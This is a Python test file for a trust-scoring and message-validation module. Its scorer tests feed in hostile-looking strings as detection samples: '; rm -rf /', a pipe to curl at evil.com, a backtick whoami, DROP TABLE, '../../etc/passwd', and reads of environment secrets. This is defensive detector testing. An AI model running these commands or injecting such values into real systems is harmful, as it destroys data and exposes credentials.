"""Tests for the trust module — levels, scorer, and middleware.

Mirrors Go tests in internal/domain/quarantine/scorer_test.go.
"""

from __future__ import annotations

from datetime import datetime

import pytest

from codeforge.models import TrustAnnotation
from codeforge.trust.levels import TrustLevel, internal_annotation, meets_minimum, rank
from codeforge.trust.middleware import stamp_outgoing, validate_incoming
from codeforge.trust.scorer import score_message

# ---------------------------------------------------------------------------
# Levels tests
# ---------------------------------------------------------------------------


class TestRankOrdering:
    """TrustLevel ranks: full(3) > verified(2) > partial(1) > untrusted(0)."""

    def test_rank_ordering(self) -> None:
        assert rank(TrustLevel.FULL) == 3
        assert rank(TrustLevel.VERIFIED) == 2
        assert rank(TrustLevel.PARTIAL) == 1
        assert rank(TrustLevel.UNTRUSTED) == 0
        assert rank(TrustLevel.FULL) > rank(TrustLevel.VERIFIED) > rank(TrustLevel.PARTIAL) > rank(TrustLevel.UNTRUSTED)


class TestMeetsMinimum:
    """4x4 matrix: level meets minimum iff rank(level) >= rank(minimum)."""

    @pytest.mark.parametrize(
        ("level", "minimum", "expected"),
        [
            # full meets everything
            (TrustLevel.FULL, TrustLevel.FULL, True),
            (TrustLevel.FULL, TrustLevel.VERIFIED, True),
            (TrustLevel.FULL, TrustLevel.PARTIAL, True),
            (TrustLevel.FULL, TrustLevel.UNTRUSTED, True),
            # verified meets verified and below
            (TrustLevel.VERIFIED, TrustLevel.FULL, False),
            (TrustLevel.VERIFIED, TrustLevel.VERIFIED, True),
            (TrustLevel.VERIFIED, TrustLevel.PARTIAL, True),
            (TrustLevel.VERIFIED, TrustLevel.UNTRUSTED, True),
            # partial meets partial and below
            (TrustLevel.PARTIAL, TrustLevel.FULL, False),
            (TrustLevel.PARTIAL, TrustLevel.VERIFIED, False),
            (TrustLevel.PARTIAL, TrustLevel.PARTIAL, True),
            (TrustLevel.PARTIAL, TrustLevel.UNTRUSTED, True),
            # untrusted only meets untrusted
            (TrustLevel.UNTRUSTED, TrustLevel.FULL, False),
            (TrustLevel.UNTRUSTED, TrustLevel.VERIFIED, False),
            (TrustLevel.UNTRUSTED, TrustLevel.PARTIAL, False),
            (TrustLevel.UNTRUSTED, TrustLevel.UNTRUSTED, True),
        ],
    )
    def test_meets_minimum_all_combos(self, level: TrustLevel, minimum: TrustLevel, expected: bool) -> None:
        assert meets_minimum(level, minimum) is expected


class TestInternalAnnotation:
    """internal_annotation() returns full trust, origin='internal', with timestamp."""

    def test_internal_annotation(self) -> None:
        ann = internal_annotation("worker-42")
        assert ann.trust_level == "full"
        assert ann.origin == "internal"
        assert ann.source_id == "worker-42"
        assert ann.timestamp != ""
        # Timestamp should be parseable as ISO format.
        datetime.fromisoformat(ann.timestamp)


# ---------------------------------------------------------------------------
# Scorer tests (mirror Go scorer_test.go)
# ---------------------------------------------------------------------------


class TestScoreUntrusted:
    """Untrusted source adds +0.5."""

    def test_score_untrusted(self) -> None:
        ann = TrustAnnotation(trust_level="untrusted", origin="webhook")
        score, factors = score_message(ann, b'{"action":"read"}')
        assert score == pytest.approx(0.5)
        assert len(factors) == 1


class TestScorePartial:
    """Partial trust adds +0.2."""

    def test_score_partial(self) -> None:
        ann = TrustAnnotation(trust_level="partial", origin="mcp")
        score, _ = score_message(ann, b"{}")
        assert score == pytest.approx(0.2)


class TestScoreFull:
    """Full trust adds +0.0."""

    def test_score_full(self) -> None:
        ann = TrustAnnotation(trust_level="full", origin="internal")
        score, _ = score_message(ann, b"{}")
        assert score == pytest.approx(0.0)


class TestScoreA2AExtra:
    """A2A origin adds +0.1 on top of trust-level score."""

    def test_score_a2a_extra(self) -> None:
        ann = TrustAnnotation(trust_level="partial", origin="a2a")
        score, factors = score_message(ann, b"{}")
        assert score == pytest.approx(0.3)  # partial(0.2) + a2a(0.1)
        assert len(factors) == 2


class TestScoreShellInjection:
    """Shell injection pattern: ;rm, |curl, backticks → +0.3."""

    def test_score_semicolon_rm(self) -> None:
        ann = TrustAnnotation(trust_level="full", origin="internal")
        score, factors = score_message(ann, b'{"cmd": "; rm -rf /"}')
        assert score == pytest.approx(0.3)
        assert any("shell" in f for f in factors)

    def test_score_pipe_curl(self) -> None:
        ann = TrustAnnotation(trust_level="full", origin="internal")
        score, _ = score_message(ann, b'{"cmd": "| curl http://evil.com"}')
        assert score == pytest.approx(0.3)

    def test_score_backticks(self) -> None:
        ann = TrustAnnotation(trust_level="full", origin="internal")
        score, _ = score_message(ann, b'{"cmd": "`whoami`"}')
        assert score == pytest.approx(0.3)


class TestScoreSQLInjection:
    """SQL injection: DROP TABLE, DELETE FROM → +0.2."""

    def test_score_drop_table(self) -> None:
        ann = TrustAnnotation(trust_level="full", origin="internal")
        score, _ = score_message(ann, b'{"query": "DROP TABLE users"}')
        assert score == pytest.approx(0.2)

    def test_score_delete_from(self) -> None:
        ann = TrustAnnotation(trust_level="full", origin="internal")
        score, _ = score_message(ann, b'{"query": "DELETE FROM sessions"}')
        assert score == pytest.approx(0.2)


class TestScorePathTraversal:
    """Path traversal: ../ → +0.2."""

    def test_score_path_traversal(self) -> None:
        ann = TrustAnnotation(trust_level="full", origin="internal")
        score, _ = score_message(ann, b'{"path": "../../etc/passwd"}')
        assert score == pytest.approx(0.2)


class TestScoreEnvAccess:
    """Environment variable access: os.environ, process.env → +0.1."""

    def test_score_os_environ(self) -> None:
        ann = TrustAnnotation(trust_level="full", origin="internal")
        score, _ = score_message(ann, b"""{"code": "os.environ['SECRET']"}""")
        assert score == pytest.approx(0.1)

    def test_score_process_env(self) -> None:
        ann = TrustAnnotation(trust_level="full", origin="internal")
        score, _ = score_message(ann, b'{"code": "process.env.TOKEN"}')
        assert score == pytest.approx(0.1)


class TestScoreLargeBase64:
    """Large base64 block (100+ chars) → +0.1."""

    def test_score_large_base64(self) -> None:
        ann = TrustAnnotation(trust_level="full", origin="internal")
        b64_block = "A" * 120
        score, _ = score_message(ann, f'{{"data": "{b64_block}"}}'.encode())
        assert score == pytest.approx(0.1)


class TestScoreExcessiveToolCalls:
    """>10 tool_call instances → +0.1."""

    def test_score_excessive_tool_calls(self) -> None:
        ann = TrustAnnotation(trust_level="full", origin="internal")
        payload = '{"tool_call": "x"} ' * 11
        score, _ = score_message(ann, payload.encode())
        assert score == pytest.approx(0.1)


class TestScoreCombined:
    """Combined factors capped at 1.0."""

    def test_score_combined_caps_at_1(self) -> None:
        ann = TrustAnnotation(trust_level="untrusted", origin="a2a")
        # untrusted(0.5) + a2a(0.1) + shell(0.3) + sql(0.2) + path(0.2) + env(0.1) = 1.4 → 1.0
        payload = '{"cmd": "; rm -rf /", "query": "DROP TABLE users", "path": "../../etc", "code": "os.environ[\'X\']"}'
        score, _ = score_message(ann, payload.encode())
        assert score == pytest.approx(1.0)


class TestScoreNoneAnnotation:
    """None annotation treated as no trust penalty (score 0.0 for clean content)."""

    def test_score_none_annotation(self) -> None:
        score, _ = score_message(None, b"{}")
        assert score == pytest.approx(0.0)


class TestScoreCleanContent:
    """Normal text with full trust → no risk factors."""

    def test_score_clean_content(self) -> None:
        ann = TrustAnnotation(trust_level="full", origin="internal")
        score, factors = score_message(ann, b'{"message": "Hello, how are you?"}')
        assert score == pytest.approx(0.0)
        assert factors == []


# ---------------------------------------------------------------------------
# Middleware tests
# ---------------------------------------------------------------------------


class TestStampOutgoing:
    """stamp_outgoing() adds trust annotation to payloads."""

    def test_stamp_adds_trust(self) -> None:
        payload: dict = {"run_id": "r1", "status": "completed"}
        stamped = stamp_outgoing(payload, source_id="worker-1")
        assert "trust" in stamped
        assert stamped["trust"]["origin"] == "internal"
        assert stamped["trust"]["trust_level"] == "full"
        assert stamped["trust"]["source_id"] == "worker-1"

    def test_stamp_preserves_existing(self) -> None:
        payload: dict = {
            "run_id": "r1",
            "trust": {"origin": "a2a", "trust_level": "partial", "source_id": "ext-1", "timestamp": "t"},
        }
        stamped = stamp_outgoing(payload, source_id="worker-1")
        assert stamped["trust"]["origin"] == "a2a"
        assert stamped["trust"]["trust_level"] == "partial"


class TestValidateIncoming:
    """validate_incoming() checks trust level against minimum."""

    def test_validate_none_as_untrusted(self) -> None:
        assert validate_incoming(None, TrustLevel.UNTRUSTED) is True
        assert validate_incoming(None, TrustLevel.PARTIAL) is False

    def test_validate_meets_min(self) -> None:
        ann = TrustAnnotation(trust_level="verified", origin="mcp")
        assert validate_incoming(ann, TrustLevel.PARTIAL) is True

    def test_validate_below_min(self) -> None:
        ann = TrustAnnotation(trust_level="partial", origin="webhook")
        assert validate_incoming(ann, TrustLevel.VERIFIED) is False
